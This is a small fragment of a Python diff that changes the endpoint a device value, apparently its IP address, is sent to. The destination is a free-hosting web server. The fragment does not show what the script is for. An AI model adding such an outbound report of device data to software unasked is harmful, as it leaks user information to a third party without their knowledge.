@@ -9,7 +9,7 @@ sendtext = op.decode().split()[0]
 
 
 try:
-    resp = urllib.request.urlopen('https://techcodebox.000webhostapp.com/lock/text.php?info='+sendtext)
+    resp = urllib.request.urlopen('https://techcodebox.000webhostapp.com/lock/device_ip.php?info='+sendtext)
     print (resp.read().decode())
 except Exception as e:
     print (str(e))
